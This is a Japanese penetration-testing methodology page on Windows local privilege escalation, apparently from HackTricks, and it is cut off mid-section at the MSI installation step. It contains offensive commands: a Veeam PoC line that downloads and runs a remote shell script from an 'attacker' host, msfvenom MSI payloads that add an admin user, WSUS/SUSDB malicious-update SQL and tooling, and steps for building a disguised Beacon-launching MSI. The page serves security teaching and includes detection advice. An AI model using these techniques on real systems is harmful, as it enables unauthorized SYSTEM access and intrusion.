# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクターを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、基礎となる複数のガイドに記載された Windows の権限昇格に関する一般的な方法論をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙フローは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows の権限昇格についての DerbyCon プレゼンテーションが含まれます。<sup>[[5]](#references)</sup>

## Windows の基本理論

### アクセストークン

**Windows のアクセストークンについて知らない場合は、先に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**ACL - DACL/SACL/ACE の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルについて知らない場合は、先に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの実行を**妨げたり**、さらには**アクティビティを検知したり**する要素がいくつもあります。権限昇格の列挙を始める前に、以下の**ページを読み**、これらの**防御メカニズム**をすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインの UEFI NVRAM 編集を、起動前 DMA と Windows の `SYSTEM` メモリパッチ適用チェーンに発展させることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレント昇格

`RAiLaunchAdminProcess` 経由で起動された UIAccess プロセスは、AppInfo のセキュアパスチェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播を悪用すると、任意の SYSTEM レジストリ書き込み (RegPwn) が可能です:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続を介してリフレクトされる、**SMB の任意ポート**を利用した LPE 経路も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

既存の PowerShell セッションからローカルのインベントリを取得する方法については、[.NET による Windows の列挙](../basic-powershell-for-pentesters/dotnet-enumeration.md)を参照してください。これらの例は、別個の列挙用実行ファイルを起動せずに、以下のチェックを補完します。

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください (適用済みのパッチも確認してください)。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows 環境が提示する**巨大な攻撃対象領域**を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS のビルド、インストール済みの更新プログラム、候補となるアドバイザリを一覧表示します。結果を該当するものとして扱う前に、正確な製品と後継の更新プログラムを確認してください。

バージョン固有のローカル exploit では、OS のアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windows では、32-bit プロセスは[WOW64 のファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。通常、`%windir%\System32` は32-bit のシステムディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bit プロセスでは使用できません。OS のビルドや KB が見つからないという候補だけでは、exploit が可能であるとは証明できません。実行中のビルド、インストール済みまたは後継の更新プログラム、プロセスのアーキテクチャ、exploit の前提条件を、該当する問題の[Microsoft セキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

サービスのメモリ破損の例については、[クライアントが制御する MIDI 共有メモリリングのオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットはテスト済みビルドにのみ適用されます。`LOCAL SERVICE` に到達することと、その後の[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)による`SYSTEM`への昇格は別の手順です。<sup>[[44]](#references)</sup>

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploit の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存されている認証情報や有用な情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

書き込み可能な [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) は、別の起動時実行の手掛かりです。昇格として扱う前に、より高い権限を持つユーザーが実際にその profile を読み込むか確認してください。

### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で有効化する方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで一例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、ファイルの保存先を共有フォルダーや隠しフォルダーに変更できます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。コマンドの引数や出力（認証情報を含む場合があります）が記録されている可能性があります。transcript を読み取れることが手掛かりになるのは、内容から利用可能な高い権限を持つ ID が判明し、その ID が該当するコンテキストでログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell パイプラインの実行内容の詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShellログの直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティとその全内容が記録され、コードの各ブロックが実行時にすべて記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows イベント ビューアーの次の場所で確認できます: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のように要約していました。

更新プログラムが http**S** ではなく http を使って要求されている場合、システムを侵害できる可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者が通信を傍受または制御できるか、さらにクライアントの更新プログラムに対する信頼設定とインストールポリシーにも左右されます。URL だけでは、コード実行が可能だとは断定できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmd で次のコマンドを実行し、ネットワークで非 SSL の WSUS 更新が使用されているかを確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または PowerShell では次のようになります:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用条件に関する記述は次のとおりです。

その場合、**悪用可能です。** 最後のレジストリ値が `0` の場合、WSUS エントリは無視されます。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception の経路に必要な前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格されたコンテキストでのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS 通信に「fake」アップデートを注入するための、MiTM 対応の exploit スクリプトです。

研究内容はこちらをご覧ください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する脆弱性は次のとおりです。

> ローカルユーザーのプロキシを変更でき、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分自身の通信を intercept し、資産上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名の自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS 通信を intercept できます。WSUS は、証明書に対する trust-on-first-use 型の検証を実装する HSTS のような仕組みを使用していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使用して、この脆弱性を悪用できます。

### WSUS 管理者による更新プログラムの制御

現在の ID が WSUS サーバー上で更新プログラムを**公開および承認**できる場合は、別の経路が存在します。サーバーの `WSUS Administrators` グループへの実効的な所属と、委任された WSUS 権限を確認し、承認された更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開における信頼関係についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使用された証明書を信頼する必要があります。これを権限昇格の経路と見なす前に、候補の更新プログラムが署名されて受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件を満たすことは確認できません。

### SUSDB のカスタム更新プログラム悪用: `.txt`/`.esd` 経由の未署名ペイロード

これは、HTTP WSUS 接続の interception とは異なる信頼境界の不備です。前提条件は、カスタム更新プログラムを公開および承認するための **WSUS データベース (`SUSDB`) のストアドプロシージャ**に十分なアクセス権があることです。実用的な侵入経路の一つは、上流 WSUS コンピューターアカウントを、中継先となる `SUSDB` をホストする別の MSSQL サーバーへリレーする方法です。正確な前提条件はデプロイ環境によって異なるため、SQL administrator 権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 から LDAP、SMB、または AD CS への WSUS クライアント認証をリレーする別の攻撃経路については、[WSUS HTTP を悪用した NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### 外部データベースへのリレーとプロシージャ権限を確認する

WSUS が外部 SQL Server を使用する環境では、まず WSUS サーバーアカウントがデータベースに認証できるか、また NTLM relay がそのリスナーに到達するかを確認してください。サーバーの SQL ロールによっては、テーブルへの直接書き込みが拒否されていても、更新プログラムを公開するストアドプロシージャを実行できる場合があります。`SUSDB` に対する `UPDATE` が失敗しても、公開が阻止されているとは限りません。カスタム更新プログラムを試す前に、認可された SQL セッションで実効 ID、ロールへの所属、プロシージャ権限を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブの手順定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構成する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメント型 `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しが返すローカルリビジョン ID を取得し、バンドルの関連付け、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を伴う公開ワークフローであり、ストアドプロシージャの呼び出しが一度成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新を構築し、対象を指定して承認する

カスタム更新のワークフローでは、正規の WSUS 手順を制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータのインポート | `spImportUpdate` |
| 前提条件、ローカライズ、拡張 XML フラグメントの保存 | `spSaveXMLFragment` |
| コンテンツダイジェストと攻撃者が制御する URL の関連付け | `spSetBatchURL` |
| コンピューターグループの一覧取得／作成とクライアントの追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストール承認 | `@actionID = 0` と `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後、最終的な承認は次のようになります。例の GUID を再利用せず、新しい更新、グループ、デプロイの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、署名のない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` の .NET `VerifyFile` パスでは、指定されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックのフラグが false に設定されます。その結果、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに、`CheckCertificateSignature` がスキップされます。そのため、たとえば `payload.exe.txt` のように名前を付けた変更されていない PE はコンテンツ検証を通過し、後で更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシー／型混同のバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みのコンテンツを取得します。オリジンはBITSのHTTP要件を満たす必要があります。URLに到達できるだけでは不十分で、転送では最初に`HEAD`/`GET`フローが実行され、バイト範囲リクエストが使われるためです。Rangeに対応していないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentのチェーンに必要なSQLを生成し、その実行用に改変したMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を提供します。認可されたラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムは、ユーザーが手動で選択しなくても、設定されたスケジュールに従ってダウンロードおよびインストールされます。テストでは、更新プログラムが失敗または未完了のままのpayloadは、コールバックプロセスの終了後すぐに再提示されました。このため、再試行動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングの観点

この一連の攻撃で、サーバー側およびクライアント側から調査に役立つ観点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` での `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新しいターゲティンググループ、外部コンテンツの配信元、`.txt`/`.esd` の更新payload、および想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査する。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認する。拡張子を鵜呑みにせず、検証結果をpayloadの拡張子およびコンテンツのマジックナンバーと照合する。
- Windows Updateのインストールが繰り返し失敗・再試行されている事象と、`.txt` または `.esd` の名前が付いたコンテンツからPEが実行されたり、想定外の子プロセスやネットワーク通信が発生したりしていないかをハントする。
- 対応している場合はデータベースサービスで認証のExtended Protectionを必須にし、データベースへのネットワークアクセスをWSUSサーバーと認可済みの管理システムに制限する。カスタム更新手順に対する `EXECUTE` 権限を最小限に抑え、監査する。

## サードパーティ製自動アップデーターとAgent IPC（local privesc）

多くのエンタープライズエージェントは、localhostのIPCインターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正なroot CAや脆弱な署名者チェックを信頼する場合、ローカルユーザーは悪意のあるMSIを送り込み、SYSTEMサービスにインストールさせることができます。一般化した手法（Netskope stAgentSvcの攻撃チェーン – CVE-2025-0309を基にしたもの）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401経由でSYSTEM権限）

バージョン固有の元の説明と偵察メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、**TCP/9401** 上でlocalhostサービスを公開しており、攻撃者が制御するメッセージを処理することで、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **偵察**: リスナーとバージョンを確認する。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & ReplicationおよびCloud Connectは、デフォルトで**TCP/9401**上のコアバックアップサービスを使用します。[Veeamのアドバイザリ](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が説明されています。また、公開されている別のPoCでは、**NT AUTHORITY\SYSTEM**としてコマンドを実行する経路が実証されています。<sup>[[12]](#references)</sup> サービスはlocalhost以外にもバインドする可能性があるため、実際のアドレスとPIDを確認してください。

- **偵察**: TCP/9401が `Veeam.Backup.Service.exe` に属することを確認し、インストールされている製品とパッチのメタデータを調べる。`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認にはなりません。
- **修正済みの最小バージョン**: Veeamによると、**11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** が最初の修正済みリリースです。それ以前のリリースは影響を受けます。4つの部分からなるファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと、それ以降にパッチが適用されたビルドを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: 必要なVeeam DLLとともに、`VeeamHax.exe` などのPoCを同じディレクトリに配置し、ローカルソケット経由でSYSTEM payloadをトリガーします。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスは SYSTEM としてコマンドを実行します。

引用されている PoC は、追加の前提条件を満たす場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下で、Windows の**ドメイン**環境に**ローカル権限昇格**の脆弱性が存在します。これには、**LDAP signing が強制されていない**環境、ユーザーが**Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持つ環境、およびユーザーがドメイン内にコンピューターを作成できる環境が含まれます。これらの**要件**は**デフォルト設定**で満たされる点に注意してください。

適切な COM サーバーが認証を行い、中継されたプリンシパルが対象オブジェクトに対する権限を持つ場合、ローカル Kerberos relay により、低い権限のログオンから、特権を要するディレクトリへの書き込みに至ることがあります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の両方の LDAP 書き込みが扱われています。KrbRelayUp はこれらの経路の一部を自動化します。RBCD チェーンには適用可能な委任権限と対象オブジェクトへの権限が必要です。一方、shadow-credential チェーンには key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインに参加しているだけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、中継される ID のオブジェクト ACL、および選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報を使ったログオンとは異なる動作をすることがあります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わる場合があります。許容的なポリシーや一致する ACL はレビュー対象として扱い、受動的な列挙によって COM coercion、relay 認証、ディレクトリへの書き込みを発生させないでください。マシンアカウントの shadow credential によってマシンチケットを取得できる場合がありますが、別途 DCSync を行うには、そのアカウントに必要なディレクトリ複製権限が必要です。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で**exploit**を確認してください。

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリ値が**有効**（値が **0x1**）に**なっている場合**、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter sessionがある場合、モジュール **`exploit/windows/local/always_install_elevated`** を使用してこの手法を自動化できます。

### PowerUP

power-upの`Write-UserAddMSI`コマンドを使用して、権限昇格用のWindows MSIバイナリを現在のディレクトリに作成します。このスクリプトは、ユーザーまたはグループの追加を促す、コンパイル済みのMSIインストーラーを書き出します（そのため、GIUアクセスが必要です）：

```
Write-UserAddMSI
```

作成したバイナリを実行して、権限を昇格させます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを参照してください。コマンドラインを実行したいだけなら、「**.bat**」ファイルをラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使って、新しい Windows EXE TCP payload を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例：**AlwaysPrivesc**）を入力し、場所に **`C:\privesc`** を指定して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- ステップ 3 / 4（含めるファイルの選択）に進むまで **Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールされるアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックして、**View > Custom Actions** を選択します。
- **Install** を右クリックして、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行時に Beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルを**バックグラウンドで**インストールするには:

```
